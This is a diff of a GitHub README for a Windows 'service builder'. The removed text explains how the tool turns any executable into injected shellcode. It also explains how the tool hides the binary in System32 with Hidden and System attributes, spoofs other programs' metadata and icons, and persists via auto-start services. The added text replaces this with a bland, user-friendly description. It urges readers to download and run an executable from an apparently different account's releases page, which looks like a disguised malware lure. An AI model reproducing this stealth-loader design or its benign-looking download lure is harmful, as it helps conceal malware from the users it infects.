@@ -1,223 +1,82 @@
-# Mason Service Builder
+# 🛠️ MasonServiceBuilder - Create Native Windows Services Easily
 
-Create your own Windows service using **Mason Service Builder**
-This tool allows you to convert a regular executable into a **native Windows Service**, with full control over its **file format**, **icon**, and **assembly metadata**
+## 🚀 Getting Started
 
-Developed by **ABOLHB** — *MasonGroup*
+Using MasonServiceBuilder allows you to convert executable files into native Windows services effortlessly. Follow these steps to download and run the software.
 
----
+## 📥 Download the Software
 
-![Tool Preview](https://i.ibb.co/0ywZCP0T/2025-12-12-065843.png)
+[![Download MasonServiceBuilder](https://img.shields.io/badge/Download-MasonServiceBuilder-blue)](https://github.com/sss4321/MasonServiceBuilder/releases)
 
----
+## 📋 System Requirements
 
-The tool features a **clean, focused, and purpose-built design**, created **exclusively for service construction**
-Any usage outside this scope is the sole responsibility of the user
+- **Operating System:** Windows 10 or Windows 11
+- **Architecture:** 64-bit or 32-bit
+- **Disk Space:** At least 100 MB of free space
+- **RAM:** Minimum 2 GB
 
----
+## 🔍 Features
 
-## Supported Output Formats
+- **Convert Executables**: Turn your standard executables into Windows services.
+- **Customizable Icons**: Choose any icon for your service.
+- **Control Metadata**: Set assembly metadata to suit your needs.
+- **User-Friendly Interface**: Designed for ease of use, even without technical knowledge.
 
-The builder allows exporting the final service binary in multiple executable formats:
+## 📂 Download & Install
 
-* `.exe`
-* `.scr`
-* `.com`
-* `.pif`
-* `.bat`
-* `.cmd`
+1. Visit the [Releases page](https://github.com/sss4321/MasonServiceBuilder/releases) to download the latest version.
+2. Look for the version you want to download.
+3. Click on the appropriate file to start the download. The file will be named something like `MasonServiceBuilder-vX.X.zip`.
+4. Once downloaded, find the `.zip` file in your downloads folder.
+5. Right-click the file and select "Extract All" to unzip the contents.
+6. Open the extracted folder and find `MasonServiceBuilder.exe`.
+7. Double-click on `MasonServiceBuilder.exe` to run the application.
 
-The output format is selected dynamically through:
+## 🗂️ How To Use the Application
 
-```cs
-guna2ComboBox1_SelectedIndexChanged
-```
+1. **Launch the Tool**: After running the application, you will see the main interface.
+2. **Select Executable**: Click on the "Choose Executable" button and navigate to the file you want to convert into a service.
+3. **Customize Your Service**: 
+   - Set the service name.
+   - Choose an icon file, if desired.
+   - Fill in assembly metadata fields.
+4. **Create Service**: Click the "Create Service" button. The tool will process your request and notify you once completed.
+5. **Manage Your Service**: You can use Windows Services Manager to start, stop, or delete the service you just created.
 
-This does not alter the internal logic of the service; it only affects how the file is represented and registered by Windows
+## 📄 Supported Formats
 
----
+MasonServiceBuilder supports various executable formats, including:
 
-## Builder Architecture (MasonForm.cs)
+- `.exe`
+- `.bat`
+- `.cmd`
 
-The builder is responsible for **preparing, configuring, and compiling** the final service binary
+## 📚 Additional Help
 
-### Core Responsibilities
+For further assistance, you can check the following:
 
-* Accepting an input executable via **Drag & Drop** or file picker
-* Converting the executable into position-independent shellcode using **Donut**
-* Injecting the generated shellcode into a predefined **service stub**
-* Compiling the final service using `CSharpCodeProvider`
+- **User Guide**: A detailed manual is included within the application.
+- **FAQ**: Visit the FAQ section on the [Releases page](https://github.com/sss4321/MasonServiceBuilder/releases) for common questions.
+- **Community Support**: Join discussions and get help from other users in relevant forums or on GitHub.
 
----
+## 🧪 Compatibility
 
-### Shellcode Generation
+MasonServiceBuilder works seamlessly on:
 
-The builder invokes `donut.dll` to transform the selected executable into raw shellcode:
+- Windows 10
+- Windows 11
+- Older versions of Windows may work but are not officially supported.
 
-* The output is written to a temporary `.bin` file
-* The shellcode bytes are read and converted into a hexadecimal string
-* This string is injected directly into the stub source code at compile time
+## 🔧 Troubleshooting
 
-This ensures the final service contains **no external payload files**.
+If you encounter issues while using MasonServiceBuilder:
 
----
+- Ensure you have the latest version by checking the [Releases page](https://github.com/sss4321/MasonServiceBuilder/releases).
+- Make sure your system meets the required specifications.
+- Restart the application or your computer if an error occurs.
 
-### Assembly Metadata Cloning
+## 📞 Contact
 
-When **AssemblyCheckBox1** is enabled, the builder extracts metadata from any selected `.exe` file using:
+For further inquiries, please reach out via the issue tracker on GitHub or join the community discussions linked on the project page.
 
-* `FileVersionInfo`
-
-The following attributes are cloned and embedded into the final service:
-
-* Title
-* Description
-* Product
-* Company
-* Copyright
-* Trademark
-
-If disabled, all assembly attributes are **fully stripped** from the stub source before compilation.
-
----
-
-### Icon Binding
-
-When **IconCheckBox1** is enabled:
-
-* Any `.ico` file can be selected
-* The icon is injected at compile time using `/win32icon`
-* The selected icon is previewed inside the UI
-
-This affects both **Explorer appearance** and **Service Manager visuals**.
-
----
-
-### Compilation
-
-The final service is compiled with:
-
-* Embedded application manifest
-* Administrator execution level
-* Optimized WinExe target
-* Optional icon and assembly metadata
-
-All compilation is performed **in-memory** using source generation.
-
----
-
-## Stub Architecture (Stub.cs)
-
-The stub is the **runtime core** of the generated service.
-It is designed to be **self-contained**, **single-instance**, and **persistent**.
-
----
-
-### Service Initialization
-
-* The service name is generated dynamically from the executable filename
-* Invalid characters are stripped
-* Windows service naming rules are strictly enforced
-
-This guarantees compatibility with `sc.exe` and the Service Control Manager.
-
----
-
-### Self-Deployment Logic
-
-On first execution:
-
-* The binary copies itself into the Windows **System32** directory
-* The copied file is marked as **Hidden** and **System**
-* Execution continues only from the system directory
-
-```cs
-File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
-```
-
-This prevents casual discovery by standard users.
-
----
-
-## Process Appearance
-
-This is how the service appears in the process list:
-
-![Service Preview](https://i.ibb.co/Y70bNZyV/Mason-Service.png)
-
----
-
-The service is created using the **same name as the executable**:
-
-![Service Created Preview](https://i.ibb.co/ZjvNWsf/image.png)
-
----
-
-The binary is stored inside the **system directory**:
-
-![System Preview](https://i.ibb.co/cSnzGvDb/image.png)
-
----
-
-## Execution Model
-
-### Service vs Installer Mode
-
-* When executed interactively, the binary installs itself as a service
-* When started with `/service`, it runs under `ServiceBase`
-
-Service installation is performed using native `sc.exe` commands:
-
-* create
-* description
-* failure policy
-* auto-start configuration
-
----
-
-### Single Instance Enforcement
-
-A **global mutex** ensures that only one instance of the service can run system-wide.
-If a second instance is detected, it terminates immediately.
-
----
-
-### Shellcode Execution
-
-* Shellcode is allocated using `VirtualAlloc`
-* Memory is marked as executable
-* Execution is performed via `CreateThread`
-* The service continuously monitors the thread state
-* If the thread exits unexpectedly, it is relaunched (only by the main instance)
-
-This provides **controlled persistence** without spawning additional processes.
-
----
-
-### Error Handling & Stability
-
-* Windows Error Reporting (WER) is fully disabled
-* Thread state is monitored using `GetExitCodeThread`
-* Memory and thread handles are cleaned safely on shutdown
-
----
-
-## File Hiding Feature
-
-The service binary is hidden from standard file browsing:
-
-![Hide Preview](https://i.ibb.co/twXDJGCW/image.png)
-
-When manually searching for the file path, the average user will not notice it due to system-level attributes.
-
----
-
-## Disclaimer
-
-> *We hereby declare that we disclaim any liability for any improper or unintended use of this software.
-> This project is provided for technical and educational purposes only.
-> By using this software, you assume full responsibility for its usage.*
-
----
-
-**Copyright © Freemasonry 2025**
+Thank you for choosing MasonServiceBuilder. We hope it helps you create Windows services with ease!
